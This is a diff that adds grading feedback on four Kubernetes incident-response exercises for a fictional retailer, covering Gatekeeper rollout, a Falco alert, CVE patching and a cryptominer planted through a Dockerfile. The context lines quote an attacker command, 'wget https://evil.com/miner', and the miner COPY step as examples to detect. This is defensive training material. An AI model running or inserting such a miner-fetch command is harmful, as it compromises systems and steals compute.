@@ -4468,3 +4468,134 @@ The fix requires:
 This is the **cheapest and most effective control** — a human reviewer looking at `wget https://evil.com/miner` in a Dockerfile diff would have immediately flagged it. The attacker succeeded because the compromised developer credentials allowed a **direct push to main**, bypassing branch protection and code review. Enforcing branch protection with no exceptions — not even for "trusted" developers — would have stopped the entire attack chain at step 2.
 
 
+
+I've reviewed your answers thoroughly. Let me grade each one.
+
+---
+
+## Q1: Gatekeeper Emergency and Policy Rollout — Grade: 4.85/5 ⭐
+
+### What you nailed:
+
+**The two-option immediate response is operationally mature.** Option A (patch to dryrun) is the correct first choice — it preserves the policy for audit data while unblocking deployments. Option B (delete the webhook configuration) is correctly identified as the nuclear option with the right caveat: Gatekeeper recreates it automatically on restart, so you're not permanently disabling security. The fact that you presented both with explicit criteria for when to choose each ("if patching doesn't take effect fast enough") shows you understand that incident response needs fallback plans, not just Plan A.
+
+**The blast radius assessment using `dryrun` + audit is exactly right.** Setting the constraint to `dryrun` and then checking `.status.violations` leverages Gatekeeper's audit controller to scan ALL existing resources against the policy — giving you a complete violation inventory without blocking anything. The `kubectl get constraint` one-liner to enumerate violations across all constraint types is the fastest way to get the full picture.
+
+**The Rego policy for read-only root filesystem with writable path exceptions is well-constructed.** The two-layer check — first verify `readOnlyRootFilesystem: true`, then verify all `volumeMounts` against `emptyDir` volumes for writable paths — is the correct approach. You correctly identified that the policy shouldn't just check `readOnlyRootFilesystem` in isolation; it needs to validate that apps have legitimate writable paths via `emptyDir` for `/tmp`, `/var/cache`, etc.
+
+**The rollout plan has all the right phases with realistic timelines.** The 2-week dryrun → 2-week warn → deny progression with explicit success criteria (violation count decreasing, team acknowledgment) and communication plan (Slack announcements, team office hours, wiki documentation) is exactly how NovaMart should roll out any new policy.
+
+### What was missing:
+
+**Your Rego has a subtle logic gap.** Your policy checks that writable paths have corresponding `emptyDir` volumes, but it doesn't check the INVERSE: what if a container has `readOnlyRootFilesystem: false` but ALSO has `emptyDir` mounts? Your policy would still flag the missing `readOnlyRootFilesystem: true`, which is correct — but the error message should guide the developer: "Set readOnlyRootFilesystem: true and use emptyDir volumes for paths that need to be writable: /tmp, /var/cache, /var/log." Without this guidance in the violation message, developers will just set `readOnlyRootFilesystem: true` and watch their app crash because they didn't add the emptyDir mounts. The policy is technically correct but operationally incomplete without the actionable error message.
+
+**You didn't mention testing the policy with `conftest` before deploying.** The entire incident happened because someone deployed without testing. Your rollout plan should explicitly include: "All ConstraintTemplate changes MUST be tested in CI with `conftest test` using fixture files (good pods that should pass, bad pods that should fail) BEFORE applying to any cluster." This is the prevention for the root cause, not just the rollout strategy for the specific policy.
+
+---
+
+## Q2: Falco Alert Investigation — Grade: 4.9/5 ⭐
+
+### What you nailed:
+
+**The first 10 minutes are sequenced correctly and demonstrate incident muscle memory.** The critical sequence: (1) acknowledge PagerDuty, (2) verify the alert is real (`kubectl get pod` — confirm it exists), (3) network-isolate the pod with a deny-all NetworkPolicy BEFORE anything else. This is the correct order. You don't kill the pod first because you lose forensic evidence. You don't investigate first because the attacker might still be active. You isolate first, then investigate.
+
+**The NetworkPolicy for isolation is correct and surgical:**
+```yaml
+podSelector:
+  matchLabels:
+    app: order-svc
+policyTypes: ["Ingress", "Egress"]
+# No ingress/egress rules = deny all
+```
+This cuts network access while keeping the pod running for forensic collection. Smart.
+
+**The evidence source list is comprehensive (7 sources where I asked for 5):** Falco event history in Loki, container filesystem (`kubectl cp` or exec), Kubernetes audit logs, network flow logs (VPC Flow Logs), ECR image history, Bitbucket commit history, and CloudTrail for any AWS API calls. The distinction between "developer debugging" (legitimate process, no exfiltration, matches known developer activity) vs "attacker" (external IP, obfuscated commands, lateral movement attempts) is the right analytical framework.
+
+**The blast radius assessment is methodologically sound.** Check all pods running the same image (`kubectl get pods --all-namespaces -o json | jq` filtering by image), check if the vulnerability is in the image or was exploited at runtime (if RCE, any pod with the same code version is vulnerable even if not yet exploited), and check Falco history for similar alerts across other namespaces.
+
+**The defense-in-depth gap analysis is thorough.** You correctly identified:
+- **Network**: No egress NetworkPolicy allowed the pod to reach `45.33.32.156` — should have had default-deny egress with explicit allowlist
+- **Pod Security**: `readOnlyRootFilesystem` would have prevented writing `/tmp/curl` — the executable couldn't have been written to disk
+- **Admission**: Gatekeeper's registry policy passed because the image was legitimate — admission can't prevent runtime exploitation
+- **Runtime**: Falco DID detect it — the question is response time and automation
+
+### What was missing:
+
+**You didn't capture a forensic snapshot of the pod before isolation.** Before applying the NetworkPolicy, you should capture the pod's current state:
+
+```bash
+# Snapshot running processes
+kubectl exec -n orders order-svc-7f8b9c6d4-x2k9p -- ps auxf > /tmp/forensics/ps.txt 2>/dev/null
+# Snapshot network connections
+kubectl exec -n orders order-svc-7f8b9c6d4-x2k9p -- cat /proc/net/tcp > /tmp/forensics/netstat.txt 2>/dev/null
+# Snapshot filesystem changes
+kubectl exec -n orders order-svc-7f8b9c6d4-x2k9p -- find /tmp /var -newer /proc/1/exe -ls > /tmp/forensics/new-files.txt 2>/dev/null
+```
+
+The reason this matters: applying the NetworkPolicy might cause the attacker's processes to behave differently (retry loops, error states, cleanup scripts that delete evidence). Capturing state BEFORE the isolation preserves the most accurate forensic picture. You did eventually capture filesystem contents, but the process list and network connections should be captured in the same breath as the initial verification — before any containment action changes the pod's behavior. This is a fine-grained sequencing issue, not a conceptual gap.
+
+---
+
+## Q3: Supply Chain Incident — Grade: 4.85/5 ⭐
+
+### What you nailed:
+
+**The cross-reference methodology is correct and production-realistic.** Pulling running image digests from all pods (`kubectl get pods --all-namespaces -o json | jq` extracting `imageID`), comparing against the ECR scan results (which report by digest), and producing a "vulnerable + running" intersection list. The `aws ecr describe-image-scan-findings` command to get the specific CVE details per image is the right API call.
+
+**The parallel execution plan is well-structured.** Critical/PCI services first (payment, fraud), then revenue-impacting (orders, cart), then everything else. Building images in parallel across 3-4 Jenkins agents while coordinating ArgoCD sync waves is the right approach. The 4-hour timeline is tight but achievable with your plan: Hour 1 (identify + start rebuilds), Hour 2 (first wave deployed + verified), Hour 3 (second wave), Hour 4 (final wave + verification).
+
+**Handling the vacation team's pinned digest images is organizationally realistic.** You correctly identified: (1) platform team has authority to update base image digests for security patches — this should be in the team contract/RACI, (2) update the Dockerfile with the patched digest, (3) build and scan, (4) document everything for the team to review when they return. The organizational point — "this is why we need automated base image update PRs (Renovate/Dependabot) rather than manual pinning" — is the systemic fix.
+
+**The automated CVE-to-deploy pipeline design is solid.** ECR Enhanced Scanning → EventBridge → Lambda (severity filter + SBOM cross-reference) → Jenkins rebuild job → ArgoCD sync. Safety gates: only auto-deploy if tests pass, only for CRITICAL CVEs, only if the patch exists (don't rebuild for unfixed CVEs), human approval gate for PCI services. The "SBOM cross-reference" step is the key insight — don't rebuild all 200 images, only the ones whose SBOM contains the affected package.
+
+### What was missing:
+
+**You didn't address the pull-through cache angle.** NovaMart uses ECR pull-through cache for `gcr.io/distroless` images. When the upstream publishes the patched base image, does the pull-through cache automatically pick it up? The answer is: yes, but only when someone pulls the tag. If your Dockerfile uses a digest pin (which 3 services do), the pull-through cache won't help — you need to explicitly resolve the new digest. For the tag-based services, you need to ensure the pull-through cache has refreshed before rebuilding, or you'll rebuild with the cached vulnerable version. A quick `docker pull` or `crane copy` to force cache refresh should be step 0 of the rebuild process.
+
+**The communication plan is good but missing one audience: customers.** For a CVSS 9.8 RCE in a library used by customer-facing services, your security team may need to assess whether customer data was at risk. If so, your legal/compliance team needs to be looped in for potential disclosure obligations (GDPR, state breach notification laws). You mentioned CISO communication but not the compliance/legal angle. For NovaMart's scale ($2B/year, 50M users), this is a non-trivial consideration.
+
+---
+
+## Q4: Defense in Depth Failure Analysis — Grade: 4.9/5 ⭐
+
+### What you nailed:
+
+**The CI/CD layer analysis is precisely correct and demonstrates deep understanding of scanning tool limitations.** You correctly identified:
+- Trivy scans for KNOWN CVEs and KNOWN malware signatures. A custom-compiled cryptominer binary won't match any CVE database entry. Trivy's secret scanner looks for credential patterns, not arbitrary binaries.
+- SonarQube analyzes SOURCE CODE, not Docker build artifacts. The miner was added in the Dockerfile (`COPY --from=builder /miner /usr/local/bin/`), which SonarQube doesn't parse.
+- The key insight: **there is a gap between source code analysis and image analysis.** The Dockerfile is the bridge, and neither tool fully covers it. Trivy config scans Dockerfiles for misconfigurations (running as root, etc.) but NOT for "this COPY statement brings in a suspicious binary."
+
+**The admission layer analysis correctly identifies the fundamental limitation.** The image was built by NovaMart's CI, signed with NovaMart's KMS key, from NovaMart's ECR. Every admission check passes because the image is LEGITIMATE from the policy's perspective. Admission control verifies PROVENANCE (who built it) and CONFIGURATION (how it's deployed), not BEHAVIOR (what it does at runtime). This is the correct architectural understanding of why admission control has an inherent blind spot for insider/compromised-credential attacks.
+
+**The Falco failure analysis gives 4 specific reasons (asked for 3):**
+1. Process name evasion — miner renamed to something innocent like `java` or `worker`
+2. Mining pool connection over HTTPS on port 443 — looks like normal HTTPS traffic, Falco rule checked specific pool hostnames but the miner used an IP or a non-listed pool
+3. Low CPU usage — miner configured to use only 1-2 cores, below alerting thresholds, blending in with normal Java workload
+4. Falco events dropped under load — if the search namespace is high-traffic, ring buffer overflow could miss the initial exec event
+
+All four are realistic and each represents a different evasion technique.
+
+**The detection improvements are layered and complementary:**
+- **Metrics anomaly:** CPU usage baseline deviation — if search-svc normally uses 200m-400m CPU and suddenly sustains 800m+, that's detectable via Prometheus even without knowing it's a miner. `rate(container_cpu_usage_seconds_total[5m]) > 2 * avg_over_time(container_cpu_usage_seconds_total[7d])` catches the behavioral anomaly regardless of process name.
+- **Falco rule improvement:** Don't rely on process name lists. Use the stratum protocol detection (miners use the stratum+tcp:// protocol which has a distinctive handshake), detect any long-running process not in the original image entrypoint, and alert on any process with sustained CPU > threshold that isn't the main application PID.
+- **Network monitoring:** DNS queries to unusual domains (DGA detection), sustained outbound connections to single IPs, traffic pattern analysis (mining has a distinctive send/receive ratio).
+- **The `proc.is_exe_writable` drift rule would catch this IF the miner was downloaded at runtime.** But since it was baked into the image at build time, drift detection wouldn't fire. You correctly identified this distinction.
+
+### What was missing:
+
+**One detection mechanism you didn't mention: image diff comparison.** If NovaMart keeps a record of expected image contents (via SBOM), you can periodically compare the SBOM of running images against a "known good" baseline. The cryptominer binary would appear as an unexpected entry in the SBOM diff. This isn't real-time detection, but a scheduled job running `syft` against deployed images and diffing against the last approved SBOM would have caught the extra binary within the scan interval (daily or weekly). This bridges the gap between "build-time analysis missed it" and "runtime detection was evaded" — a third detection plane at the artifact content level.
+
+**On the Bitbucket credential compromise:** You didn't discuss how to detect the initial credential compromise. The attacker pushed a commit from a developer's account — did Bitbucket have anomaly detection (new IP, unusual commit time, unusual file touched)? MFA on Bitbucket? Branch protection requiring a second reviewer for Dockerfile changes? The PR review process is a human control that should have caught `COPY --from=builder /miner` in the Dockerfile diff. If this passed code review, either the review was rubber-stamped or the Dockerfile change was obfuscated. Either way, the fix includes: mandatory PR reviews for ALL Dockerfile changes with a security-aware reviewer, and Bitbucket access anomaly detection. You touched on this briefly but didn't fully close the loop on the initial access vector prevention.
+
+---
+
+---
+
+### Pattern Analysis
+
+Your security thinking is consistently strong across all four layers. The gaps are narrowing to a very specific pattern: **forensic procedure sequencing** (capturing state before containment actions) and **ecosystem completeness** (pull-through cache refresh, legal/compliance notification, image content diffing as a third detection plane). These are operational refinements that separate "senior engineer who handles incidents well" from "principal engineer who handles incidents perfectly." You're firmly in the former category with consistent flashes of the latter.
+
+The Q4 answer was particularly impressive. Understanding WHY each tool fails — not just that it fails — is the mark of someone who won't over-rely on any single security layer. The statement that admission control verifies provenance not behavior, and that this is an architectural limitation not a configuration error, is exactly the right framing.
+
+---
+
